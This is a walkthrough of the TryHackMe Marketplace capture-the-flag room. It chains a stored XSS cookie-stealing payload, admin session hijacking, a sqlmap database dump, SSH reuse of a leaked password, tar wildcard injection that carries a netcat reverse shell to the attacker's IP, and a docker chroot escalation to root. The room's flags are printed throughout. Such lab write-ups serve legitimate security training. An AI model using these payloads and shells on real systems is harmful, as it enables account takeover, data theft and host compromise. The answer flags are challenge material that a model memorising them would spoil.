# Walkthrough : TryHackMe - Marketplace CTF
## Step 1: OpenVPN & Nmap Reconnaissance
### 1. VPN Connection Established:
Connected to the TryHackMe network via ap-south-1-varunkr578-regular.ovpn, receiving the local VPN IP (192.168.135.130).
### 2. Nmap Port Scan:
- Target: 10.48.164.96
- Command executed:
```bash
nmap -sV -sC -p- 10.48.164.96
```
Key Results:
- 22/tcp — SSH (OpenSSH 7.6p1 Ubuntu)
- 80/tcp — HTTP (nginx 1.19.2)
- 32768/tcp — HTTP (Node.js / Express middleware)

## Step 2: Directory Discovery & Web Analysis
### 1. Gobuster Enumeration:
- Command executed:
```bash
gobuster dir -u http://10.48.164.96 -w /usr/share/wordlists/dirb/common.txt
```
Discovered Endpoints:
- /admin (403 Forbidden)
- /login (200 OK)
- /signup (200 OK)
- /new (302 Redirect to /login)
- /messages (302 Redirect to /login)
- /robots.txt (Disallowed: /admin)

### 2. Application Functionality:
- Users can sign up, log in, create new listings, and report existing listings to site administrators.
- Reporting a listing triggers an automated bot/admin review process, creating a prime target for Stored / Blind XSS.

### Step 3: Stored / Blind XSS Payload Setup
### 1. Setting Up a Local Listener:
Start a HTTP listener or Netcat session on your machine (192.168.135.130) to capture incoming admin session tokens:
```bash
python3 -m http.server 8000
```
### 2. Crafting the XSS Payload:
Inject a JavaScript payload into a new listing (in the Title or Description field) designed to exfiltrate the administrator's cookie or authorization token upon viewing:
```bash
<script>fetch('http://192.168.135.130:8000/?c='+document.cookie)</script>
```
### 3. Triggering Admin Review:
- Publish the listing on /new.
- Click "Report listing to admins" on your created item (or report item /item/1 / /item/3 depending on the ID).
- Wait for the admin bot to review the report and trigger the callback to your Python server.

---

## Blind XSS Cookie Exfiltration & Session Hijacking.
## Step 1: Payload Construction & Testing
### 1. Testing Image-Based Data Exfiltration:
To bypass basic filter restrictions or CORS issues, construct an inline JavaScript snippet that appends a dynamic image element pointing to your Kali listener (192.168.135.130:8080) containing document.cookie:
```bash
var image = new Image(10, 10);
image.src = "http://192.168.135.130:8080/?" + document.cookie;
document.body.appendChild(image);
```
### 2. Console Verification:
- Executing this script in the browser console successfully triggers an outbound GET request appended with the active user session cookie (token=...).
- The Python HTTP server running on port 8080 catches the request, confirming the exfiltration path works.

## Step 2: Injecting Stored XSS Payload into Listing
### 1. Creating the Malicious Listing:
Navigate to [http://10.48.164.96/new](http://10.48.164.96/new) and wrap the script inside standard HTML script tags. Insert it directly into the Description field:
```bash
<script>
  var image = new Image(10, 10);
  image.src = "http://192.168.135.130:8080/?" + document.cookie;
  document.body.appendChild(image);
</script>
```
### 2. Publishing & Verification:
- Submit the listing to save the payload persistently to the database.
-Accessing the newly generated item page (/item/<id>) verifies the code executes upon rendering.

## Step 3: Triggering Admin Review & Stealing Admin Token
### 1. Reporting the Item:
Click "Report listing to admins" on the target listing to trigger the automated background admin bot to visit /item/<id>.

### 2. Capturing the Admin Cookie:
- Monitor your terminal running python3 -m http.server 8080.
- When the admin bot loads the reported page, your server receives an incoming HTTP GET request containing the administrator's JWT/session token in the query parameters.

### 3. Hijacking Admin Session:
- Copy the exfiltrated cookie value (e.g., token=eyJ...).
- Open Developer Tools -> Storage / Application -> Cookies in your browser.
- Replace your current token value with the administrative token and refresh the page to gain access to /admin.

## Exfiltrating the Token & Decoding the Payload.
### Step 1: Validating Exfiltration via Browser Console
To verify that the target application executes inline JavaScript and allows outbound connections, test the dynamic image exfiltration payload directly in the browser developer console.
- Action: Open Developer Tools (F12), navigate to the Console tab, and execute the test script:
```bash
var image = new Image(10, 10);
image.src = "http://192.168.135.130:8080/?" + document.cookie;
document.body.appendChild(image);
```
- Observation: The browser appends an <img> tag to the DOM. The network request triggers an outbound connection to the local listener on port 8080, confirming that document.cookie is accessible via client-side script execution.

![image]()
![image]()

## Step 2: Preparing and Injecting the Stored Payload
With outbound exfiltration confirmed, format the JavaScript payload with proper HTML tags so it executes automatically whenever an admin renders the listing page.
- Payload Construction: Wrap the code in standard <script> tags:
```bash
<script>
  var image = new Image(10, 10);
  image.src = "http://192.168.135.130:8080/?" + document.cookie;
  document.body.appendChild(image);
</script>
```
Injection: Navigate to /new ("Add new listing"). Enter a standard title (e.g., phone) and paste the malicious script block into the Description field. Submit the form to store the payload persistently in the database.

![image]()
![image]()

## Step 3: Triggering Admin Review & Capturing Token
Once the item is published, utilize the application's reporting mechanism to direct the automated administrator bot to the stored payload.
- Action: Navigate to the newly created listing (/item/<id>) and click "Report listing to admins" (/report/<id>).
- Listener Output: The admin bot visits the page, executing the script in its context. The Python HTTP listener running on Kali receives a GET request appended with the administrator's token parameter.

![image]()
![image]()

### Step 4: JWT Analysis & Session Replacement
Extract the administrator's JSON Web Token (JWT) from the HTTP logs to analyze its payload and replace your current session cookie.
- Token Extraction: Copy the full raw JWT string from the incoming HTTP request path.

![image]()

JWT Decoding: Paste the token into jwt.io to inspect the claims:
- Header: Identifies the signing algorithm (HS256).
- Payload: Decodes the claim data, confirming userId: 2, username: "michael", and elevated privileges (admin: true).

![image]()

Session Hijacking:
- Open Developer Tools -> Storage -> Cookies ([http://10.48.164.96](http://10.48.164.96)).
- Locate the existing token key and replace its value with the exfiltrated admin JWT.
- Refresh the page to assume the administrative context.

![image]()

---

## Administrative Privilege Exploitation, SQL Injection & SSH Access.
## Step 1: Accessing the Administration Panel & Flag Retrieval
After updating the local session token with the exfiltrated admin JWT, access to administrative routes is granted.
- Action: Navigate to [http://10.48.164.96/admin](http://10.48.164.96/admin).
- Observation: The Administration Panel renders the User listing page, displaying user IDs, usernames, and administrative statuses. The initial flag is displayed at the top of the panel:
```bash
THM{c37a63895910e478f28669b048c348d5}
```
![image]()

## Step 2: Identifying SQL Injection in the Admin Panel
Inspecting administrative sub-pages reveals an input validation flaw in parameter handling.
- Testing Route: Navigate to [http://10.48.164.96/admin?user=1](http://10.48.164.96/admin?user=1) to view individual user details.
- Fuzzing Parameter: Append a single quote (') to the query parameter:
```bash
http://10.48.164.96/admin?user=1'
```
Error Output: The application returns a verbose MySQL syntax error:
```bash
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "'' at line 1
```
![image]()
![image]()

### Step 3: Database Automated Exploitation via SQLmap
Leverage sqlmap with the captured administrative JWT to exploit the UNION-based SQL injection vulnerability and dump backend databases.
- Command:
```bash
sqlmap -u "http://10.48.164.96/admin?user=1" -p user --technique=U --cookie="token=<EXFILTRATED_ADMIN_JWT>" --dump
```
Execution Results:
- DBMS: MySQL 8.0 (Express/Nginx backend)
- Database Identified: marketplace
- Tables Dumped: users, items, messages

![]()
![]()

## Step 4: Extracting Credentials & Analysis
Analyzing the dumped database content yields sensitive system communications and user credentials.
Database Contents Analysis (Mousepad view):
- users Table: Contains bcrypt password hashes for system, michael, jake, admin, and abcd.
- messages Table: Inspecting entry ID 1 reveals an automated system message addressed to user ID 3 (jake):
```bash
Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: @b_ENXkGYUCAv3zJ
```
![]()
![]()

## Step 5: SSH Authenticated Access & User Flag Capture
Use the recovered SSH password to authenticate as jake against the target system host and extract the user flag.
- SSH Connection:
```bash
ssh jake@10.48.164.96
```
- Authentication: Enter password @b_ENXkGYUCAv3zJ when prompted.
- Flag Extraction: Upon successful shell interaction, list home directory contents and read user.txt:
```bash
ls
cat user.txt
```
User Flag:
```bash
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

---

## Privilege Escalation & Root Access
## Step 1: Enumerating Sudo Privileges for User Jake
After establishing SSH access as jake, check current sudo execution rights to identify potential escalation paths.
- Command:
```bash
sudo -l
```
Observation: The output indicates jake is permitted to execute /opt/backups/backup.sh as user michael without password authentication (NOPASSWD):
```bash
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

## Step 2: Exploiting Tar Wildcard Injection for Lateral Movement
Inspecting /opt/backups/backup.sh reveals that it executes tar using a wildcard (*) within /opt/backups. This allows for arbitrary command execution via tar command-line flags embedded in filenames.
- Payload Setup:
a. Create a reverse shell script (shell.sh):
```bash
echo '#!/bin/bash' > shell.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.135.130 443 >/tmp/f' >> shell.sh
chmod +x shell.sh
```
b. Create wildcard argument files in /opt/backups:
```bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```
- Execution:
1. Start a Netcat listener on the attacker machine:
```bash
nc -lvnp 443
```
2. Trigger the backup script as michael:
```bash
sudo -u michael /opt/backups/backup.sh
```
- Result: tar parses --checkpoint=1 and --checkpoint-action=exec=sh shell.sh as command-line options rather than filenames, executing shell.sh and establishing a reverse shell as user michael (uid=1002(michael)).

## Step 3: Enumerating Docker Privileges & Root Privilege Escalation
Once authenticated as michael, evaluate group memberships to check for elevated system rights.
- Command:
```bash
id
```
- Observation: michael belongs to group 999(docker), granting access to manage container operations:
```bash
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```
- Root Escalation: Mount the host filesystem (/) into a local Alpine container and spawn a root shell:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```
- Result: The host system's root directory is mounted at /mnt, and chroot changes the root filesystem context to mount point, yielding interactive root user access on the target system host.

## Step 4: Final Root Flag Extraction
Navigate to the root user directory and retrieve the target system flag.
- Command:
```bash
cd /root
cat root.txt
```
- Root Flag:
```bash
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```
